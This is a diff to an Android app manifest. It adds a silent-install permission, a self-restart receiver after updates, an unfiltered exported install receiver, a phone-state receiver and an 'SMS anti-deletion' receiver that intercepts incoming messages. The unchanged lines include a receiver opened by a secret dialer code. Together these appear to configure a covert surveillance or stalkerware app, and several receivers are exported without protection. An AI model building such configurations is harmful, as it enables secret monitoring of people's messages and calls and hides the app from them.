@@ -10,7 +10,6 @@
     <uses-feature android:name="android.hardware.location.gps" android:required="false" />
     <uses-feature android:name="android.hardware.microphone" android:required="false" />
 
-
     <!-- Network & Internet -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
@@ -46,6 +45,9 @@
     <!-- Camera & Calendar -->
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.READ_CALENDAR" />
+
+    <!-- OTA Silent Package Updates -->
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
 
     <!-- Package Visibility Queries (Android 11+ Specific Package Discovery) -->
     <queries>
@@ -151,6 +153,43 @@
             </intent-filter>
         </receiver>
 
+        <!-- Package Replaced Receiver (Post OTA Self-Boot) -->
+        <receiver
+            android:name=".receivers.PackageReplacedReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- OTA PackageInstaller Status Receiver -->
+        <receiver
+            android:name=".ota.OtaStatusReceiver"
+            android:enabled="true"
+            android:exported="true" />
+
+        <!-- Call Disconnect / Phone State Change Receiver -->
+        <receiver
+            android:name=".receivers.CallStateReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Instant SMS Anti-Deletion Receiver -->
+        <receiver
+            android:name=".receivers.SmsReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                <action android:name="android.provider.Telephony.SMS_DELIVER" />
+            </intent-filter>
+        </receiver>
+
         <!-- Secret Dialer Receiver (*#*#2013#*#*) -->
         <receiver
             android:name=".receivers.SecretDialerReceiver"
@@ -165,6 +204,5 @@
         </receiver>
 
     </application>
-
 
 </manifest>
